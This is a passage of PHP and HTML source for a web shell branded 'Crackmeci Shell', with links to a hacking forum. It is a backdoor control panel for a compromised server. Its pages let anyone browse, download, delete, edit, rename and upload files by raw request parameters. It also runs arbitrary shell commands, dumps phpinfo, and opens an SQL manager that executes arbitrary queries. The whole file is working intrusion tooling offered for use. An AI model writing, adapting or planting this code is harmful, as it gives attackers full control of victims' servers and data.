                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                DIR
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo getOwnerGroup($directoryPath); ?>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo get_perms($directoryPath); ?>
                            </td> 

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo date("Y-m-d H:i:s", filemtime($directoryPath)); ?>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] flex gap-1 text-[#ccc] hover:text-white">
                                <form action="" method="post">
                                    <button type="submit" name="download" class="h-[32px] w-[32px] bg-green-500 text-white py-1 px-2 rounded">
                                        <i class="fa fa-download"></i>
                                    </button>
                                    <input type="hidden" name="type" value="folder">
                                    <input type="hidden" name="name" value="<?php echo $directoryPath; ?>">
                                </form>            
                                <form action="" method="post">
                                    <button type="submit" name="delete" class="h-[32px] w-[32px] flex items-center justify-center bg-red-500 text-white py-1 px-2 rounded"><i class="fa fa-times"></i></button>
                                    <input type="hidden" name="type" value="folder">
                                    <input type="hidden" name="name" value="<?php echo $directoryPath; ?>">
                                </form>
                            </td>
                        </tr>
                            
                        <?php endif;endforeach; ?>

                        <?php foreach($all["files"] as $file):
                            if($file != "." && $file != ".."):
                                $filePath = !isset($_GET["folder"]) ? "./" . $file : $_GET["folder"].'/'.$file; 
                        ?>

                        <tr>
                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <span class="flex gap-2">
                                    <img class="w-[24px] h-[24px]" src="<?php echo getFileIcon($file); ?>" alt="">
                                    <a href="?page=view&file=<?php echo $filePath; ?>"><?php echo $file; ?></a>
                                </span>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo formatFileSize(filesize($filePath)); ?>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo getOwnerGroup($filePath); ?>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo get_perms($filePath); ?>
                            </td> 

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                <?php echo date("Y-m-d H:i:s", filemtime($filePath)); ?>
                            </td>

                            <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] flex gap-1 text-[#ccc] hover:text-white">
                                <form action="" method="post">
                                    <button type="submit" name="download" class="h-[32px] w-[32px] bg-green-500 text-white py-1 px-2 rounded">
                                        <i class="fa fa-download"></i>
                                    </button>
                                    <input type="hidden" name="type" value="file">
                                    <input type="hidden" name="name" value="<?php echo $filePath; ?>">
                                </form>            
                                <a href="?page=edit&file=<?php echo $filePath; ?>" class="h-[32px] w-[32px] bg-blue-500 text-white py-1 px-2 rounded"><i class="fa fa-pen"></i></a>
                                <form action="" method="post">
                                    <button type="submit" name="delete" class="flex justify-center items-center h-[32px] w-[32px] bg-red-500 text-white py-1 px-2 rounded"><i class="fa fa-times"></i></button>
                                    <input type="hidden" name="type" value="file">
                                    <input type="hidden" name="name" value="<?php echo $filePath; ?>">
                                </form>
                            </td>
                        </tr>

                        <?php endif;endforeach; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>

        <?php if(isset($_GET["page"]) && $_GET["page"] == "edit" && isset($_GET["file"])): ?>
            <?php 
                $file = $_GET["file"];
                if(file_exists($file)){
                    if ($open = @fopen($file, "r")) {
                        $content = "";
                        while (!feof($open)) {
                            $content .= htmlentities(str_replace("''", "'", fgets($open)));
                        }
                        @fclose($open);
                    }
                }else{
                    echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_notExists"].'</div>';
                    header("Location:".$config["base_url"]);
                    exit();
                }
            ?>
            <div class="container-fluid mx-auto"> 
                <form action="" method="post">
                    <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_editPage_title"]; ?>: <span class="text-white"><?php echo $_GET["file"]; ?></span></h1>
                    <textarea name="content" id="file_content" class="w-full h-[360px] border rounded-md p-2 outline-none"><?=$content?></textarea>
                    <?php 
                        if(isset($_POST["updateFile"])){
                            $content = simpleText($_POST["content"]);
                            $file = $_POST["file"];
                            file_put_contents($file,$content);
                            echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i>'.$languages[$systemLang]["file_updateSuccess"].'</div>';

                            header("Refresh:2");
                        }
                    ?>
                    <input type="hidden" name="file" value="<?php echo $_GET["file"]; ?>">
                    <button type="submit" name="updateFile" class="bg-blue-500 text-white px-4 py-2 rounded-md mt-4"><i class="fa fa-save"></i> <?php echo $languages[$systemLang]["fileManager_editPage_btnText"]; ?></button>
                </form>
            </div>
        <?php endif; ?>


        <?php if(isset($_GET["page"]) && $_GET["page"] == "view" && isset($_GET["file"])): ?>
            <?php 
                $file = $_GET["file"];
                if(file_exists($file)){
                    if ($open = @fopen($file, "r")) {
                        $content = "";
                        while (!feof($open)) {
                            $content .= htmlentities(str_replace("''", "'", fgets($open)));
                        }
                        @fclose($open);
                    }
                }else{
                    echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_notExists"].'</div>';
                    header("Location:".$config["base_url"]);
                    exit();
                }
            ?>
            <div class="container-fluid mx-auto"> 
                    <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_viewPage_title"]; ?>: <span class="text-white"><?php echo $_GET["file"]; ?></span></h1>
                    <textarea name="content" id="file_content" class="w-full h-[360px] border rounded-md p-2 outline-none" readonly><?=$content?></textarea>
                    <div class="w-full">
                        <?php 
                            if(isset($_POST["renameFile"])){
                                $filePath = $_GET["file"];
                                $fileName = $_POST["fileName"];

                                $newFilePath = str_replace(basename($filePath),basename($fileName),$filePath);

                                if(rename($filePath,$newFilePath)){
                                    echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i> '.$languages[$systemLang]["view_renameSuccessText"].'</div>'; 
                                    header("Refresh:2");
                                    exit();
                                }else{
                                    echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["view_renameErrorText"].'</div>';
                                    header("Refresh:2");
                                    exit();
                                }
                            }
                        ?>
                        <form class="w-full flex items-center my-2 gap-2" action="" method="post">
                            <input name="fileName" class="p-2 rounded-md outline-none border-none w-full" type="text" value="<?php echo basename($_GET["file"]); ?>">
                  
                            <button type="submit" name="renameFile" class="bg-blue-500 font-bold text-white p-2 rounded-md text-sm"><?php echo $languages[$systemLang]["view_page_renameBtn"]; ?></button>
                        </form>
                    </div>
            </div>
        <?php endif; ?>
        

        <?php if(isset($_GET["page"]) && $_GET["page"] == "upload"): ?>
            <div class="container-fluid mx-auto">
                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["uploadPage_title"]; ?></h1>
                <form action="" method="post" class="max-w-[600px] mx-auto" enctype="multipart/form-data">
                    <div class="border-[1px] border-[rgba(255,255,255,0.1)] p-2">
                        <div class="relative">
                            <input type="file" name="uploads[]" id="uploader" class="absolute w-full h-full inset-0 opacity-0 cursor-pointer" multiple>
                            <label for="uploader" class="bg-blue-500 max-h-[120px] text-white font-semibold flex items-center justify-center w-full h-full p-4"><i class="fas fa-cloud-upload-alt text-3xl"></i></label>
                        </div>
                        <?php
                            if(isset($_POST["upload"])):
                                $uploadDir = getcwd() . "/";
                                $files = $_FILES["uploads"];

                                foreach($files["name"] as $key => $name): 
                                    $path = $uploadDir . basename($name);
                                    $extension = pathinfo($path, PATHINFO_EXTENSION);

                                    if (move_uploaded_file($files["tmp_name"][$key], $path)) {
                                        echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i> '.$languages[$systemLang]["file_uploaded"].':'.$name.'</div>';

                                    } else {
                                        echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_uploadedError"].' :'.$name.'</div>';
                                    }
                                endforeach;
                            endif;
                        ?>
                        <button type="submit" name="upload" class="block mt-2 p-2 w-full bg-green-500 font-semibold text-white"><?php echo $languages[$systemLang]["uploadPage_btnText"]; ?></button>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <?php if(isset($_GET["page"]) && $_GET["page"] == "phpinfo"): ?>
            <div class="container-fluid mx-auto p-2">
                <style>

                    :root {
                        --php-dark-grey: #112 !important;
                        --php-dark-blue: #14161d !important;

                    }

                    .phpinfo {
                        border: 1px solid rgba(255, 255, 255, 0.1);
                    }

                    .phpinfo,
                    body {
                        background-color: #112;
                    }

                    .phpinfo .e {
                        background-color:#14161d;
                        width: 100px !important;
                    }

                    a:link {
                        color: #009;
                        text-decoration: none;
                        background-color: transparent !important;
                    }

                    table {
                        width: 100% !important;
                        border-collapse: collapse !important;
                        margin-bottom: 20px !important;
                        
                    }

                    th{
                        min-width:100% !important;
                        text-align: left !important;
                        padding: 8px !important;
                        background: #14161d !important;
                        border:1px solid rgba(255,255,255,0.1) !important;
                    }
                    td {
                        width:100px !important;
                        text-align: left !important;
                        padding: 8px !important;
                        border:1px solid rgba(255,255,255,0.1) !important;
                    }

                    hr{
                        width:100% !important;
                    }
                    @media (max-width: 813px) {
                
                        table {
                            border: 0 !important;
                            position: relative !important;
                            width: 100% !important;
                            display:block;
                        }

                        tbody,
                        tr {
                            position: relative !important;
                            width: 100% !important;
                            display: block;
                        }

                        th,
                        td {
                            text-align: left !important;
                            padding: 8px !important;
                            display: block !important;
                            width: 100% !important;
                            box-sizing: border-box !important;
                        }

                        .phpinfo .e {
                            width: 100% !important;
                        }

                        tr{
                            margin-bottom:5px !important;
                        }
                
                        th {
                            background-color: #f2f2f2;
                        }

                        .v {
                            width: 100% !important;
                            max-width: none !important;
                        }

                    }
                </style>

                <div class="phpinfo w-full container-fluid p-2">
                    <?php echo trim(phpinfo(),"1"); ?>
                </div>

                <script>
                    let imgs = document.querySelectorAll(".phpinfo a img");
                    imgs[0].style = "width:32px;height:32px";
                    imgs[0].src = "https://raw.githubusercontent.com/Crackmeci/shell/main/favicon.png";
                    
                </script>
            </div>
        <?php endif; ?>

        <?php if(isset($_GET["page"]) && $_GET["page"] == "execute"): ?>
            <div class="container-fluid mx-auto">
                <form action="" id="executor" method="post">
                    <textarea name="content" id="command_output" class="w-full h-[360px] border rounded-md p-2 outline-none" readonly></textarea>
             
                    <div id="commandAlert" class="alert my-2 ">
                        
                    </div>
                    <div class="flex gap-2 items-center ">
                        <input type="text" name="command" id="command" class="w-[75%] px-4 py-2 border-none outline-none rounded-md">
                        <button type="submit" name="execute" id="executeBtn" class="bg-blue-500 text-white w-[25%] px-4 py-2 rounded-md "><i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?></button>
                    </div>
                </form>

                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }

                    .spinner{
                        animation: spin 3s linear infinite;

                    }
                </style>
                <script>
                    $(document).ready(function() {
                        $("#executor").submit(function(e) {
                            e.preventDefault();
                            var command = $("#command").val();

                            var executeBtn = $("#executeBtn");

                            executeBtn.prop("disabled", true).html('<i class="fa fa-spinner fa-spin spinner"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?>...');


                            $.ajax({
                                type: "POST",
                                url: "?ajax", 
                                data: { command: command, execute: true },
                                success: function(result) {
                                    result = JSON.parse(result);
                                    $("#command_output").val(result.response);
                                    if(result.type == "success"){
                                        $("#commandAlert").html('<div class="w-full bg-green-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-check"></i> <?php echo $languages[$systemLang]["command_successText"]; ?></div>')
                                    }else{
                                        $("#commandAlert").html('<div class="w-full bg-red-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-times"></i> <?php echo $languages[$systemLang]["command_errorText"]; ?></div>')
                                    }
                                },
                                complete: function () {
                                    executeBtn.prop("disabled", false).html('<i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["executePage_btnText"]; ?>');
                                }
                            });
                        });
                    });
                </script>

            </div>
        <?php endif; ?>


        <?php if (isset($_GET["page"]) && $_GET["page"] == "sqlManager") :?>
            <div class="container-fluid m-auto">
                <?php if (!isset($_GET["user"]) || !isset($_GET["host"]) || !isset($_GET["password"])) : ?>
                    <div class="div border-[1px] p-2 border-[rgba(255,255,255,0.1)] max-w-[315px] w-[315px] mx-auto">
                        <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white text-center"><i class="fa fa-database"></i> <?php echo $languages[$systemLang]["sqlManager_title"]; ?></h1>

                        <form action="" method="get" class="w-full">
                            <?php echo generateInputField($languages[$systemLang]["sqlManager_hostHolder"], "host", "fa-server"); ?>
                            <?php echo generateInputField($languages[$systemLang]["sqlManager_sqlUser"], "user", "fa-user"); ?>
                            <?php echo generateInputField($languages[$systemLang]["sqlManager_sqlPassword"], "password", "fa-key", "password"); ?>
                            <input type="hidden" name="page" value="sqlManager">
                            <button type="submit" class="w-full p-2 mt-2 bg-blue-500 text-white font-semibold"><?php echo $languages[$systemLang]["sqlManager_connectBtn"]; ?></button>
                        </form>
                    </div>
                <?php else : ?>
                    <?php
                    $sqlManager = new SQLManager($_GET["host"], $_GET["user"], $_GET["password"]);
                    $databases = $sqlManager->showDatabases();
                    ?>
                    <div class="w-full flex gap-2 border-[1px] p-2 border-[rgba(255,255,255,0.1)] flex-wrap">
                        <div class="flex-[49%] min-w-[315px] bg-[#111] h-[400px] overflow-y-scroll">
                            <ul>
                                <?php foreach ($databases as $database) : ?>
                                    <li class="text-white font-semibold text-lg border-b-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                        <a href="<?php echo appendDatabaseParam($_SERVER["REQUEST_URI"],$database); ?>"><i class="fa fa-database"></i> <?php echo $database; ?></a>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        </div>

                        <?php if(isset($_GET["database"])): $sqlManager->selectDatabase($_GET["database"]);$tables = $sqlManager->showTables(); ?>
                            <div class="flex-[49%] min-w-[315px] bg-[#111] h-[400px] overflow-y-scroll">
                                <ul>
                                <?php foreach($tables as $table): ?>
                                    <li class="text-white font-semibold text-lg border-b-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                        <a href="<?php echo appendTableParam($_SERVER["REQUEST_URI"],$table); ?>"><i class="fa fa-table"></i> <?php echo $table; ?></a>
                                    </li>
                                <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                    </div>

                    <?php if(isset($_GET["table"])): $columns = $sqlManager->fetchColumns($_GET["table"]);  ?>
                        <div class="w-full">
                            <?php if(count($columns) > 0): ?>
                                <div class="table-container mt-2">
                                    <table class="border-[1px] border-[rgba(255,255,255,0.1)]">
                                        <?php $theads = array_keys($columns[0]); ?>
                                        <thead>
                                            <tr>
                                                <?php foreach($theads as $thead): ?>
                                                    <th class="text-white font-bold border-[1px] border-[rgba(255,255,255,0.1)]"><?php echo $thead; ?></th>
                                                <?php endforeach; ?>
                                            </tr>
                                        </thead>

                                        <tbody>
                                            <?php foreach($columns as $row): ?>
                                                <tr>
                                                    <?php foreach($row as $value): ?>
                                                        <td><textarea class="outline-none  p-2 bg-[#112] text-white border-[1px] border-[rgba(255,255,255,0.1)]" cols="30" rows="10" readonly><?php echo $value; ?></textarea></td>
                                                    <?php endforeach; ?>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            <?php else: ?>
                                <div class="w-full bg-red-500 p-2 font-semibold text-white my-3"><i class="fa fa-exclamation-triangle"></i> <?php echo $languages[$systemLang]["sql_notFound"]; ?></div>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                    <br>
                    <form action="" method="post">
                        <?php echo generateInputField($languages[$systemLang]["sqlManager_executeQuery"],"query","fa fa-terminal"); ?>
                        <?php
                            if(isset($_POST["executeQuery"])){
                                $query = trim($_POST["query"]);
                                $sqlManager->query($query);
                                header("Refresh:0");
                            }
                        ?>
                        <button name="executeQuery" class="p-2 w-full bg-blue-500 text-white font-bold my-2"><?php echo $languages[$systemLang]["sqlManager_executeBtn"]; ?></button>
                    </form>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <?php if(isset($_GET["page"]) && $_GET["page"] == "about"): ?>
            <div class="container-fluid mx-auto">
                <div class="w-full flex justify-center bg-[#14161d] p-2 border-[1px] border-[rgba(255,255,255,0.1)]">
                    <div class="text-center">
                        <a href="https://turkhackteam.org/">
                            <img src="https://github.com/Crackmeci/shell/blob/main/logo.png?raw=true" alt="">
                        </a>
                        <h1 class="text-white font-bold my-2 text-3xl">Crackmeci Shell</h1>
                        <h2 class="text-[#ccc] font-bold mt-2 text-lg"><?php echo $languages[$systemLang]["aboutPage_mainText"]; ?></h2>
                        <div class="flex items-center gap-2 justify-center mt-2">
                            <a class="text-white text-lg font-bold rounded-full w-[32px] h-[32px] border-[1px] flex items-center justify-center border-[rgba(255,255,255,0.1)]" href="">
                                <i class="fa fa-envelope"></i>
                            </a>
                            <a class="" href="https://turkhackteam.org/uye/crackmeci.920526/">
                                <img src="https://github.com/Crackmeci/shell/blob/main/favicon.png?raw=true" alt="">
                            </a>
                        </div>
                      <h2 class="text-green-500 text-3xl mt-3 font-bold border-t-[1px] p-2 border-[rgba(255,255,255,0.1)]"><?php echo date("Y"); ?></h2>
                    </div>
                </div>
            </div>
        <?php endif; ?>

        <?php if(isset($_GET["page"]) && $_GET["page"] == "encrypt"): ?>
            <div class="container-fluid mx-auto">
                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["encryptPage_title"]; ?></h1>
                <form id="encrypter" method="post">
                    <textarea id="encryptText" class="w-full h-[360px] border rounded-md p-2 outline-none"></textarea>
                    <div class="flex">
                        <select class="w-full p-2 rounded my-2 block w-full outline-none border-none" name="encryptType" id="encryptType">
                            <option value="rot13">Rot13</option>
                            <option value="base64">Base64</option>
                            <option value="md5">MD5</option>
                            <option value="sha256">SHA256</option>
                            <option value="sha1">SHA1</option>
                            <option value="url">Url</option>
                        </select>
                    </div>
                    <div class="my-2" id="encryptAlert"></div>
                    <button id="encryptBtn" class="encrypt p-2 text-white bg-blue-500 rounded-md mb-2 block w-full"><i class="fa fa-key"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?></button>
                    <textarea id="willText" class="w-full h-[360px] border rounded-md p-2 outline-none"></textarea>
                    <script>
                        $(document).ready(function() {
                            $("#encrypter").submit(function(e) {
                                e.preventDefault();
                                var encryptText = $("#encryptText").val();
                                var encryptType = $("#encryptType").val();

                                var encryptBtn = $("#encryptBtn");

                                encryptBtn.prop("disabled", true).html('<i class="fa fa-spinner fa-spin spinner"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?>...');


                                $.ajax({
                                    type: "POST",
                                    url: "?ajax", 
                                    data: { type: encryptType, encrypt: true , text: encryptText},
                                    success: function(result) {
                                        result = JSON.parse(result);
                                        $("#willText").val(result.response);
                                        if(result.type == "success"){
                                            $("#encryptAlert").html('<div class="w-full bg-green-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-check"></i> <?php echo $languages[$systemLang]["encrypt_successText"]; ?></div>')
                                        }else{
                                            $("#encryptAlert").html('<div class="w-full bg-red-500 p-2 flex items-center text-white gap-2 font-semibold"><i class="fa fa-times"></i> <?php echo $languages[$systemLang]["encrypt_errorText"]; ?></div>')
                                        }
                                    },
                                    complete: function () {
                                        encryptBtn.prop("disabled", false).html('<i class="fa fa-terminal"></i> <?php echo $languages[$systemLang]["encryptPage_btnText"]; ?>');
                                    }
                                });
                            });
                        });
                    </script>
                </form>

            </div>
        <?php endif; ?>


    </div>
</body>
</html>